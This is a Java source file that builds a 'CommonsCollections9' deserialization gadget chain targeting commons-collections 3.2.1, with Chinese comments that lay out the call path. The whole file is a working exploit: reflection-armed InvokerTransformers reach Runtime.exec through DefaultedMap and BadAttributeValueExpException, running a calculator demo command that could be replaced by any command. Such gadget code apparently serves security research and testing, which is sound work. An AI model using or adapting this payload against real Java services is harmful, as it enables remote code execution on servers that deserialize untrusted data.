package com.p2hm1n.gadget;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;



/**
 * CommonsCollections9 的 gadget
 * 测试环境 JDK8u45
 * cc9 主要利用的是CommonsCollections:3.2版本新增的 DefaultedMap 来代替 LazyMap
 *
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			AnnotationInvocationHandler.readObject()
 * 				Map(Proxy).entrySet()
 * 					AnnotationInvocationHandler.invoke()
 * 						DefaultedMap.get()
 * 							ChainedTransformer.transform()
 * 								ConstantTransformer.transform()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Class.getMethod()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Runtime.getRuntime()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Runtime.exec()
 */
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CC9 {
    public static void main(String[] args) throws Exception{
        final String[] execArgs = new String[] { "open -a Calculator" };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        final Map innerMap = new HashMap();
        final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        PayloadRunner.run(val);

    }
}
